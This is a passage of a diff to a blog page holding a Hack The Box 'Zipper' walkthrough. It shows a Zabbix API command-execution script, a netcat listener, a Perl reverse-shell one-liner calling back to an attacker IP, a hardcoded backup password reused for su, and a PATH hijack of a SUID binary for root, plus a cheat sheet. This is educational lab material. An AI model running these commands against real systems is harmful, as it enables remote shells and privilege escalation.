+           "params":{'user':login,'password':password},"auth":None,"id":0}
 headers = {'content-type':'application/json'}
-auth = REDACTED, data=json.dumps(payload), headers=headers).json()
+auth = requests.post(url, data=json.dumps(payload), headers=headers).json()
 
 while True:
     cmd = input('\033[41m[zabbix_cmd]&gt;&gt;: \033[0m ')
@@ -231,16 +230,16 @@ while True:
 
     payload = {"jsonrpc":"2.0","method":"script.update",
                "params":{"scriptid":"1","command":cmd,"execute_on":"0"},
-               "auth":null,"id":0}
+               "auth":auth['result'],"id":0}
     requests.post(url, data=json.dumps(payload), headers=headers)
 
     payload = {"jsonrpc":"2.0","method":"script.execute",
                "params":{"scriptid":"1","hostid":hostid},
-               "auth":null,"id":0,"execute_on":"0"}
+               "auth":auth['result'],"id":0,"execute_on":"0"}
     cmd_exe = requests.post(url, data=json.dumps(payload), headers=headers).json()
 #   print(cmd_exe["result"]["value"])
 </code></pre>
-<hr />
+<hr>
 <h3 id="step-14-get-a-reverse-shell">Step 14: Get a Reverse Shell</h3>
 <p>Start a netcat listener on your Kali machine:</p>
 <pre><code class="language-bash" data-language="bash">nc -lvnp 1337
@@ -248,36 +247,36 @@ while True:
 <p>Run the exploit:</p>
 <pre><code class="language-bash" data-language="bash">python3 39937.py
 </code></pre>
-<p>At the prompt, the bash reverse shell dies immediately. This is a shell stability issue — the Zabbix agent spawns the process in a way that kills it quickly. Instead, use the <strong>Perl reverse shell</strong> which is more stable:</p>
+<p>At the prompt, the bash reverse shell dies immediately. This is a shell stability issue - the Zabbix agent spawns the process in a way that kills it quickly. Instead, use the <strong>Perl reverse shell</strong> which is more stable:</p>
 <pre><code>perl -e 'use Socket;$i="10.10.16.84";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
 </code></pre>
 <p><strong>Why Perl works when Bash doesn't:</strong> Perl establishes the network connection within its own runtime before spawning the shell, making it independent of the parent process. Bash's <code>bash -i</code> relies on the terminal being kept alive by the parent.</p>
 <p>You now have a shell:</p>
 <pre><code>uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
 </code></pre>
-<hr />
-<h2 id="phase-5-lateral-movement-to-zapper">Phase 5 — Lateral Movement to Zapper</h2>
+<hr>
+<h2 id="phase-5-lateral-movement-to-zapper">Phase 5: Lateral Movement to Zapper</h2>
 <h3 id="step-15-find-the-hardcoded-password">Step 15: Find the Hardcoded Password</h3>
-<p>We're running as the <code>zabbix</code> service account. This account is low-privilege and doesn't have access to user home directories. But we spotted earlier that zapper has a backup script in Zabbix. Let's read it:</p>
+<p>We're running as the <code>zabbix</code> service account. This account is low-privilege and doesn't have access to user home directories. But we spotted earlier that zapper has a backup script in Zabbix. Read it:</p>
 <pre><code class="language-bash" data-language="bash">cat /home/zapper/utils/backup.sh
 </code></pre>
 <p><strong>Output:</strong></p>
 <pre><code class="language-bash" data-language="bash">#!/bin/bash
 /usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &amp;&gt;/dev/null
 </code></pre>
-<p>The <code>-p</code> flag in 7z sets a password for the archive. The password <code>ZippityDoDah</code> is hardcoded in plaintext.</p>
-<p><strong>Hacker mindset:</strong> Scripts are often overlooked as a source of credentials. Developers hardcode passwords into scripts for convenience, thinking "no one will read this." Always look at scripts, config files, and anything that automates a task — they frequently contain credentials.</p>
-<hr />
+<p>The <code>-p</code> flag in 7z sets a password for the archive. The password <code>REDACTED</code> is hardcoded in plaintext.</p>
+<p> Scripts are often overlooked as a source of credentials. Developers hardcode passwords into scripts for convenience, thinking "no one will read this." Always look at scripts, config files, and anything that automates a task - they frequently contain credentials.</p>
+<hr>
 <h3 id="step-16-switch-to-zapper">Step 16: Switch to Zapper</h3>
 <pre><code class="language-bash" data-language="bash">su zapper
-# Password: null
+# Password: REDACTED
 </code></pre>
 <pre><code class="language-bash" data-language="bash">cat /home/zapper/user.txt
 # cf479[redacted]c809188
 </code></pre>
 <p><strong>User flag captured.</strong></p>
-<hr />
-<h2 id="phase-6-privilege-escalation-to-root">Phase 6 — Privilege Escalation to Root</h2>
+<hr>
+<h2 id="phase-6-privilege-escalation-to-root">Phase 6: Privilege Escalation to Root</h2>
 <h3 id="step-17-enumerate-for-privilege-escalation">Step 17: Enumerate for Privilege Escalation</h3>
 <p>The first thing to check when you get a new user shell is what special privileges that user has:</p>
 <pre><code class="language-bash" data-language="bash">ls -la /home/zapper/utils/
@@ -285,9 +284,9 @@ while True:
 <p><strong>Output:</strong></p>
 <pre><code>-rwsr-sr-x 1 root root 7556 Sep  8 2018 zabbix-service
 </code></pre>
-<p>The <code>s</code> in <code>rws</code> means this is a <strong>SUID binary</strong> — it runs as root regardless of who executes it. This is a massive privilege escalation opportunity.</p>
-<p><strong>Hacker mindset:</strong> SUID binaries are one of the most common privesc paths on Linux. When a binary is SUID root, any code it executes inherits root privileges. If we can control what code it runs — we get root.</p>
-<hr />
+<p>The <code>s</code> in <code>rws</code> means this is a <strong>SUID binary</strong> - it runs as root regardless of who executes it. This is a massive privilege escalation opportunity.</p>
+<p> SUID binaries are one of the most common privesc paths on Linux. When a binary is SUID root, any code it executes inherits root privileges. If we can control what code it runs - we get root.</p>
+<hr>
 <h3 id="step-18-analyze-the-suid-binary">Step 18: Analyze the SUID Binary</h3>
 <p>We use <code>strings</code> to extract readable text from the binary without needing to reverse engineer it:</p>
 <pre><code class="language-bash" data-language="bash">strings /home/zapper/utils/zabbix-service
@@ -301,7 +300,7 @@ systemctl stop zabbix-agent
 </code></pre>
 <p>The binary calls <code>systemctl</code> <strong>without an absolute path</strong> (i.e., it doesn't use <code>/bin/systemctl</code>). Instead it relies on the shell's <code>PATH</code> environment variable to find <code>systemctl</code>.</p>
 <p><strong>This is the vulnerability:</strong> If we can put a fake <code>systemctl</code> binary somewhere that appears earlier in the PATH, the SUID binary will execute OUR binary as root.</p>
-<hr />
+<hr>
 <h3 id="step-19-create-a-fake-systemctl-binary">Step 19: Create a Fake systemctl Binary</h3>
 <p>We create a malicious <code>systemctl</code> that simply spawns <code>/bin/bash</code>:</p>
 <pre><code class="language-bash" data-language="bash">cat &gt; /home/zapper/utils/systemctl &lt;&lt; 'EOF'
@@ -310,15 +309,15 @@ systemctl stop zabbix-agent
 EOF
 chmod +x /home/zapper/utils/systemctl
 </code></pre>
-<p><strong>Why <code>/bin/bash</code>?</strong> When the SUID binary runs as root and calls our fake <code>systemctl</code>, it will execute <code>/bin/bash</code> with root privileges — giving us an interactive root shell.</p>
-<hr />
+<p><strong>Why <code>/bin/bash</code>?</strong> When the SUID binary runs as root and calls our fake <code>systemctl</code>, it will execute <code>/bin/bash</code> with root privileges - giving us an interactive root shell.</p>
+<hr>
 <h3 id="step-20-hijack-the-path">Step 20: Hijack the PATH</h3>
 <p>The <code>PATH</code> variable is a list of directories the shell searches when you type a command. By default, <code>/home/zapper/utils</code> is not in PATH. We add it to the <strong>front</strong> so it's searched first:</p>
 <pre><code class="language-bash" data-language="bash">export PATH=/home/zapper/utils:$PATH
 </code></pre>
 <p>Now when any program (including our SUID binary) calls <code>systemctl</code>, the shell finds our fake one in <code>/home/zapper/utils/</code> before the real one in <code>/bin/</code>.</p>
-<p><strong>Hacker mindset:</strong> PATH hijacking is a classic and elegant attack. It works because Unix resolves commands by searching PATH directories in order. The system trusts PATH, but PATH itself isn't protected. Any time a privileged binary calls a command by name rather than full path, it's potentially vulnerable.</p>
-<hr />
+<p>PATH hijacking works when a privileged process resolves a command name through an attacker-influenced search path. A privileged binary should call trusted executables by absolute path.</p>
+<hr>
 <h3 id="step-21-execute-the-suid-binary">Step 21: Execute the SUID Binary</h3>
 <pre><code class="language-bash" data-language="bash">/home/zapper/utils/zabbix-service
 # start or stop?: start
@@ -332,7 +331,7 @@ uid=0(root) gid=0(root) groups=0(root)
 # e24aa[redacted]a6cc
 </code></pre>
 <p><strong>Root flag captured.</strong></p>
-<hr />
+<hr>
 <h2 id="lessons-learned">Lessons Learned</h2>
 <h3 id="vulnerability-chain-summary">Vulnerability Chain Summary</h3>
 <pre><code>Default Apache page
@@ -347,9 +346,9 @@ uid=0(root) gid=0(root) groups=0(root)
                                     → SUID binary calls systemctl without full path
                                         → PATH hijack → root (root flag)
 </code></pre>
-<hr />
-<h3 id="key-takeaways">Key Takeaways</h3>
-<table aria-label="Key Takeaways data table">
+<hr>
+<h3 id="review-notes">Review notes</h3>
+<table aria-label="Review notes data table">
 <thead>
 <tr>
 <th scope="col">Vulnerability</th>
@@ -383,7 +382,7 @@ uid=0(root) gid=0(root) groups=0(root)
 <td>Monitoring agents should have least-privilege access</td>
 </tr>
 </tbody></table>
-<hr />
+<hr>
 <h3 id="tools-used">Tools Used</h3>
 <table aria-label="Tools Used data table">
 <thead>
@@ -421,7 +420,7 @@ uid=0(root) gid=0(root) groups=0(root)
 <td>Analyze binary without reversing</td>
 </tr>
 </tbody></table>
-<hr />
+<hr>
 <h3 id="commands-cheat-sheet">Commands Cheat Sheet</h3>
 <pre><code class="language-bash" data-language="bash"># Recon
 nmap -sV -sT -sC &lt;IP&gt;
@@ -445,10 +444,9 @@ cat &gt; /writable/dir/systemctl &lt;&lt; 'EOF'    # Fake binary
 /bin/bash
 EOF
 chmod +x /writable/dir/systemctl
-</code></pre>
-d:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]
+</code></pre>d:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]
 e:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-wall-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Wall Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-tabby-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"HackTheBox “Tabby” Walkthrough"}]]}]}]]}]
 f:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-13:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/#article","headline":"Hack The Box: Zipper Walkthrough","description":"An archived walkthrough of the retired Hack The Box Zipper machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/","datePublished":"2026-06-09T10:52:39.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2207,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/5505707ade662db4eccb34bcdf7be9cb2e44854f/HTB-Zipper.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-zipper-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Zipper Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/"}]}]}10:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
+13:T5a0,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/#article","headline":"Hack The Box: Zipper Walkthrough","description":"Guest Zabbix data revealed the Zapper account, whose matching username and password authenticated to the API; restored GUI access and agent-side script execution produced a service shell, then a backup-script password and PATH hijack in a setuid utility reached root.","url":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/","datePublished":"2026-06-09T10:52:39.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2148,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/5505707ade662db4eccb34bcdf7be9cb2e44854f/HTB-Zipper.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-zipper-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Zipper Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-zipper-walkthrough/"}]}]}10:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
 11:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
 16:null
